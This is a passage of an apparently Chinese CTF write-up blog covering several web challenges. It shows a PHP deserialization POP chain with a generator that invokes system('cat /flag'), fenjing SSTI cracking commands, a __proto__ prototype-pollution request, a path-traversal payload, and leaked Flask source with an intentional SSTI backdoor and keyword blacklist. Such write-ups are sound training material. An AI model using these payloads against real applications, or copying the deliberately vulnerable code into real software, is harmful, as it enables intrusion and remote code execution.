</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Then</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$func</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__toString</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>func</span><span class=p>)();</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;Good Job!&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Handle</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>protected</span> <span class=nv>$obj</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__call</span><span class=p>(</span><span class=nv>$func</span><span class=p>,</span> <span class=nv>$vars</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>obj</span><span class=o>-&gt;</span><span class=na>end</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Super</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>protected</span> <span class=nv>$obj</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__invoke</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>obj</span><span class=o>-&gt;</span><span class=na>getStr</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>end</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;==GAME OVER==&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>CTF</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$handle</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>end</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>unset</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>handle</span><span class=o>-&gt;</span><span class=na>log</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>WhiteGod</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$func</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$var</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__unset</span><span class=p>(</span><span class=nv>$var</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>func</span><span class=p>)(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>var</span><span class=p>);</span>    
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;pop&#39;</span><span class=p>]);</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Begin::__destruct -&gt; Then::toString -&gt; Super::__invoke -&gt; Handle::__call -&gt; CTF::end -&gt; WhiteGod::__unset
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Begin</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$name</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Then</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$func</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Super</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$obj</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Handle</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$obj</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>CTF</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$handle</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>WhiteGod</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$func</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$var</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$wg</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>WhiteGod</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$wg</span><span class=o>-&gt;</span><span class=na>func</span> <span class=o>=</span> <span class=s1>&#39;system&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$wg</span><span class=o>-&gt;</span><span class=na>var</span>  <span class=o>=</span> <span class=s1>&#39;cat /flag&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$ctf</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>CTF</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$ctf</span><span class=o>-&gt;</span><span class=na>handle</span> <span class=o>=</span> <span class=nv>$wg</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$handle</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Handle</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$handle</span><span class=o>-&gt;</span><span class=na>obj</span> <span class=o>=</span> <span class=nv>$ctf</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$super</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Super</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$super</span><span class=o>-&gt;</span><span class=na>obj</span> <span class=o>=</span> <span class=nv>$handle</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$then</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Then</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$ref</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s1>&#39;Then&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$prop</span> <span class=o>=</span> <span class=nv>$ref</span><span class=o>-&gt;</span><span class=na>getProperty</span><span class=p>(</span><span class=s1>&#39;func&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$prop</span><span class=o>-&gt;</span><span class=na>setAccessible</span><span class=p>(</span><span class=k>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$prop</span><span class=o>-&gt;</span><span class=na>setValue</span><span class=p>(</span><span class=nv>$then</span><span class=p>,</span> <span class=nv>$super</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$begin</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Begin</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$begin</span><span class=o>-&gt;</span><span class=na>name</span> <span class=o>=</span> <span class=nv>$then</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>urlencode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$begin</span><span class=p>));</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=genshin>GenShin</h2><p>发包找到路由<code>/secr3tofpop</code>，发现是SSTI，用webui的fenjing或者是直接攻击这个参数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>python</span> <span class=n>-m</span> <span class=n>fenjing</span> <span class=n>webui</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>python</span> <span class=n>-m</span> <span class=n>fenjing</span> <span class=n>crack</span> <span class=p>-</span><span class=n>-url</span> <span class=s2>&#34;http://c2e17393-1f82-4896-87bc-94bd454fc77e.node5.buuoj.cn:81/secr3tofpop&#34;</span> <span class=p>-</span><span class=n>-method</span> <span class=n>GET</span> <span class=p>-</span><span class=n>-inputs</span> <span class=n>name</span> <span class=p>-</span><span class=n>-detect-mode</span> <span class=n>fast</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=otenkigirl>OtenkiGirl</h2><p>没找到可以直接污染RCE的依赖，看看路由</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>async</span> <span class=kd>function</span> <span class=nx>getInfo</span><span class=p>(</span><span class=nx>timestamp</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>timestamp</span> <span class=o>=</span> <span class=k>typeof</span> <span class=nx>timestamp</span> <span class=o>===</span> <span class=s2>&#34;number&#34;</span> <span class=o>?</span> <span class=nx>timestamp</span> <span class=o>:</span> <span class=nb>Date</span><span class=p>.</span><span class=nx>now</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Remove test data from before the movie was released
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kd>let</span> <span class=nx>minTimestamp</span> <span class=o>=</span> <span class=k>new</span> <span class=nb>Date</span><span class=p>(</span><span class=nx>CONFIG</span><span class=p>.</span><span class=nx>min_public_time</span> <span class=o>||</span> <span class=nx>DEFAULT_CONFIG</span><span class=p>.</span><span class=nx>min_public_time</span><span class=p>).</span><span class=nx>getTime</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nx>timestamp</span> <span class=o>=</span> <span class=nb>Math</span><span class=p>.</span><span class=nx>max</span><span class=p>(</span><span class=nx>timestamp</span><span class=p>,</span> <span class=nx>minTimestamp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>data</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>sql</span><span class=p>.</span><span class=nx>all</span><span class=p>(</span><span class=sb>`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;= ?`</span><span class=p>,</span> <span class=p>[</span><span class=nx>timestamp</span><span class=p>]).</span><span class=k>catch</span><span class=p>(</span><span class=nx>e</span> <span class=p>=&gt;</span> <span class=p>{</span> <span class=k>throw</span> <span class=nx>e</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>data</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>在config里面有一个最早允许的时间，和我传入的时间做对比，取大值，再去数据库查询数据，我全局搜索也没有找到返回flag的逻辑，所以应该就是这里了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>module</span><span class=p>.</span><span class=nx>exports</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>app_name</span><span class=o>:</span> <span class=s2>&#34;OtenkiGirl&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nx>default_lang</span><span class=o>:</span> <span class=s2>&#34;ja&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nx>min_public_time</span><span class=o>:</span> <span class=s2>&#34;2019-07-09&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nx>server_port</span><span class=o>:</span> <span class=mi>9960</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nx>webpack_dev_port</span><span class=o>:</span> <span class=mi>9970</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>早于这个时间就可以了，但是必须第一次就成功，由于污染的特性，第二次就会坏了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/submit</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>982f9b3c-2b31-44f5-afff-edbf629cd0af.node5.buuoj.cn:81</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/json</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;contact&#34;</span><span class=p>:</span> <span class=s2>&#34;test&#34;</span><span class=p>,</span><span class=nt>&#34;reason&#34;</span><span class=p>:</span> <span class=s2>&#34;test&#34;</span><span class=p>,</span><span class=nt>&#34;__proto__&#34;</span><span class=p>:</span> <span class=p>{</span><span class=nt>&#34;min_public_time&#34;</span><span class=p>:</span> <span class=s2>&#34;1001-01-01&#34;</span><span class=p>}}</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=n>url</span><span class=o>=</span><span class=s2>&#34;http://982f9b3c-2b31-44f5-afff-edbf629cd0af.node5.buuoj.cn:81/info/0&#34;</span>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;user&#39;</span><span class=p>:</span><span class=s1>&#39;test&#39;</span><span class=p>,</span><span class=s1>&#39;password&#39;</span><span class=p>:</span><span class=s1>&#39;test&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>res</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=p>,</span><span class=n>headers</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;content-type&#39;</span><span class=p>:</span><span class=s1>&#39;application/x-www-form-urlencoded&#39;</span><span class=p>})</span><span class=o>.</span><span class=n>text</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>res</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=injectme>InjectMe</h2><blockquote><p>穿越我的秘密，狠狠的注入</p></blockquote><p><code>110.jpg</code>可以看到部分源码的路由<code>/download?file=..././..././app.py</code>得到源码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>render_template</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span> <span class=n>abort</span><span class=p>,</span> <span class=n>send_file</span><span class=p>,</span> <span class=n>session</span><span class=p>,</span> <span class=n>render_template_string</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>config</span> <span class=kn>import</span> <span class=n>secret_key</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>secret_key</span> <span class=o>=</span> <span class=n>secret_key</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>hello_world</span><span class=p>():</span>  <span class=c1># put application&#39;s code here</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;index.html&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s2>&#34;/cancanneed&#34;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s2>&#34;GET&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>cancanneed</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>all_filename</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>listdir</span><span class=p>(</span><span class=s1>&#39;./static/img/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>filename</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;file&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>filename</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;img.html&#39;</span><span class=p>,</span> <span class=n>filename</span><span class=o>=</span><span class=n>filename</span><span class=p>,</span> <span class=n>all_filename</span><span class=o>=</span><span class=n>all_filename</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=nb>str</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>listdir</span><span class=p>(</span><span class=s1>&#39;./static/img/&#39;</span><span class=p>))</span><span class=si>}</span><span class=s2> &lt;br&gt; &lt;a href=</span><span class=se>\&#34;</span><span class=s2>/cancanneed?file=1.jpg</span><span class=se>\&#34;</span><span class=s2>&gt;/cancanneed?file=1.jpg&lt;/a&gt;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s2>&#34;/download&#34;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s2>&#34;GET&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>download</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>filename</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;file&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>filename</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>filename</span> <span class=o>=</span> <span class=n>filename</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;../&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>filename</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s1>&#39;static/img/&#39;</span><span class=p>,</span> <span class=n>filename</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>filename</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>exists</span><span class=p>(</span><span class=n>filename</span><span class=p>))</span> <span class=ow>and</span> <span class=p>(</span><span class=s2>&#34;start&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>filename</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>send_file</span><span class=p>(</span><span class=n>filename</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>abort</span><span class=p>(</span><span class=mi>500</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>abort</span><span class=p>(</span><span class=mi>404</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/backdoor&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s2>&#34;GET&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>backdoor</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>session</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;user&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>session</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;user&#34;</span><span class=p>)</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>session</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s2>&#34;guest&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>name</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;user&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=sa>r</span><span class=s1>&#39;__|{{|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|</span><span class=se>\\</span><span class=s1>u|</span><span class=se>\\</span><span class=s1>x|\.&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>name</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>abort</span><span class=p>(</span><span class=mi>500</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>render_template_string</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=s1>&#39;竟然给&lt;h1&gt;</span><span class=si>%s</span><span class=s1>&lt;/h1&gt;你找到了我的后门，你一定是网络安全大赛冠军吧！😝 &lt;br&gt; 那么 现在轮到你了!&lt;br&gt; 最后祝您玩得愉快!😁&#39;</span> <span class=o>%</span> <span class=n>name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>abort</span><span class=p>(</span><span class=mi>500</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
